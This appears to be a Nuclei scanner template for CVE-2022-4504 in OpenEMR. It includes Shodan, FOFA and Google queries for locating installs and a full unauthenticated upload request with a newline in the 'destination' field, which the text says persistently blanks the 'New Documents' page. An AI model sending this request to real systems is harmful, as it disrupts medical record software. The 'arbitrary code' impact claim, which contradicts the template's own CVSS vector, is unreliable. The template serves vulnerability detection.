id: CVE-2022-4504

info:
  name: Improper Input Validation in GitHub repository openemr/openemr
  author: ProjectDiscoveryAI
  severity: high
  description: |
    The vulnerability allows an attacker to manipulate the name of an uploaded document by including new line characters in the "destination" parameter. This manipulation breaks the execution of JavaScript code in the "New Documents" section, rendering it blank until the document is removed from the database.
  impact: |
    An attacker could exploit this vulnerability to execute arbitrary code or perform other malicious activities.
  remediation: |
    Apply the latest patches or updates provided by the vendor to fix the improper input validation issue in the openemr/openemr GitHub repository.
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H
    cvss-score: 7.5
    cve-id: CVE-2022-4504
    cwe-id: CWE-20
    epss-score: 0.00159
    epss-percentile: 0.53492
    cpe: cpe:2.3:a:open-emr:openemr:*:*:*:*:*:*:*:*
  metadata:
    vendor: open-emr
    product: openemr
    shodan-query: http.html:"OpenEMR"
    fofa-query: app="OpenEMR"
    google-query:
      - intitle:"openemr setup tool"
      - intitle:"openemr"

http:
  - method: POST
    path:
      - "{{BaseURL}}/openemr/controller.php?document&upload&patient_id=00&parent_id=1&"

    headers:
      Content-Type: multipart/form-data; boundary=--------------------------139184551113566022282519832587

    body: |
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="MAX_FILE_SIZE"

      64000000
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="file[]"; filename="1234.txt"
      Content-Type: text/plain

      TEST
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="dicom_folder[]"; filename=""
      Content-Type: application/octet-stream
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="destination"

      test
      1234
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="passphrase"
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="patient_id"

      00
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="category_id"

      1
      ----------------------------139184551113566022282519832587
      Content-Disposition: form-data; name="process"

      true
      ----------------------------139184551113566022282519832587
      --
    matchers:
      - type: word
        words:
          - "New Documents"
        part: body
        condition: and
